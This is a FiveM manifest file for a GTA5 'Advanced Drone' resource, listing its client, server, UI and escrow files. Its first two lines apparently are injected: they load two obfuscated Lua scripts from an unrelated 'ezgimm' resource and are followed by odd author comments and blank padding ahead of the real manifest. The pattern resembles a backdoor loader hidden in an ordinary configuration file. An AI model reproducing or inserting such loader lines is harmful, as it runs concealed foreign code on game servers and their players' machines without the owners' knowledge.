shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 
 
 
fx_version 'cerulean'
game 'gta5'

author 'Danzo'
description 'Advanced Drone - Made by Danzo - Discord: https://discord.gg/8nFqCR4xVC'
version '1.1.4'

shared_script "config.lua"

client_scripts {
	'client/functions.lua',
	'client/client.lua',
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@oxmysql/lib/MySQL.lua',
	'server/server.lua',
}

escrow_ignore {
	'config.lua',
	'client/client.lua',
	'server/server.lua',
	'stream/ch_prop_casino_drone_02a.yft',
}

ui_page 'html/index.html'

files {
	'html/**/**',
}

lua54 'yes'
dependency '/assetpacks'